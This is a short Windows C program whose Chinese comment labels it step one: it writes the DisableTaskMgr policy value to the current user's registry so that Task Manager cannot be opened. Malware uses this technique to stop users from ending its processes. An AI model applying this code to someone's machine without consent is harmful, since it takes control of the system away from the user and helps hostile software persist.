#include <windows.h>

int main() {
    // 1. 禁用任务管理器（注册表）
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD dwVal = 1;
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&dwVal, sizeof(dwVal));
        RegCloseKey(hKey);
    }
	return 0;
}
